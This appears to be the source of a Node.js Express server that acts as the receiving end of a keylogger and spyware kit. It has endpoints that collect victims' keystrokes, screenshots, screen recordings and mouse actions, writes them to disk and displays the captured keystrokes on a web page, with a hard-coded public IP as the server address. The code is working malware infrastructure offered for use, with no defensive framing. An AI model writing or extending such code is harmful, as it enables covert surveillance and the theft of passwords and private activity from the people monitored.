// We import the fs module so that we can have access to the file system.
const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

// Create the express app.
const app = express();

/* app should use bodyParser. For this example, we'll use json. bodyParser allows you to
access the body of your request.
*/
app.use(bodyParser.json({ extended: true }));

// Set the server address and port number
const serverAddress = "http://3.143.237.202"; // Replace with your server's address
const portNumber = "8080"; // Replace with your server's port

// Endpoint for receiving keyboard data
app.post("/keyboard_data", (req, res) => {
  const keyboardData = req.body.keyboardData;
  console.log(keyboardData);

  // Write the keyboard capture to a text file
  fs.writeFile("keyboard_capture.txt", keyboardData, (err) => {
    if (err) {
      console.error("Error writing keyboard capture:", err);
      res.status(500).send("Internal server error");
    } else {
      console.log("Keyboard capture saved");
      res.status(200).send("Keyboard capture saved");
    }
  });
});

// Endpoint for receiving screenshots
app.post("/screenshots", (req, res) => {
  const fileData = req.body.file;
  const fileName = "screenshot.png";

  // Save the screenshot file
  fs.writeFile(fileName, fileData, "base64", (err) => {
    if (err) {
      console.error("Error saving screenshot:", err);
      res.status(500).send("Internal server error");
    } else {
      console.log("Screenshot saved:", fileName);
      res.status(200).send("Screenshot saved");
    }
  });
});

// Endpoint for receiving screen recordings
app.post("/screen_recordings", (req, res) => {
  const fileData = req.body.file;
  const fileName = req.body.fileName;

  // Save the screen recording file
  fs.writeFile(fileName, fileData, "base64", (err) => {
    if (err) {
      console.error("Error saving screen recording:", err);
      res.status(500).send("Internal server error");
    } else {
      console.log("Screen recording saved:", fileName);
      res.status(200).send("Screen recording saved");
    }
  });
});

// Endpoint for receiving mouse actions
app.post("/mouse_actions", (req, res) => {
  const fileData = req.body.file;
  const fileName = "screenshot.png";

  // Save the mouse action file
  fs.writeFile(fileName, fileData, "base64", (err) => {
    if (err) {
      console.error("Error saving mouse action:", err);
      res.status(500).send("Internal server error");
    } else {
      console.log("Mouse action saved:", fileName);
      res.status(200).send("Mouse action saved");
    }
  });
});

// When a GET request is made to the "/" resource, we return basic HTML.
app.get("/", (req, res) => {
  /* The GET request shows the data that's logged in the keyboard_capture.txt file.
  If the file keyboard_capture.txt has not yet been created, the try-catch statement will
  throw an exception and log to the homepage that nothing's been logged yet.
  */
  try {
    const kl_file = fs.readFileSync("./keyboard_capture.txt", {
      encoding: "utf8",
      flag: "r",
    });
    // We send the txt file data to the server. We replace the "\n" with <br>
    res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
  } catch {
    res.send("<h1>Nothing logged yet.</h1>");
  }
});

// Start the server
app.listen(portNumber, () => {
  console.log(`App is listening on port ${portNumber}`);
});
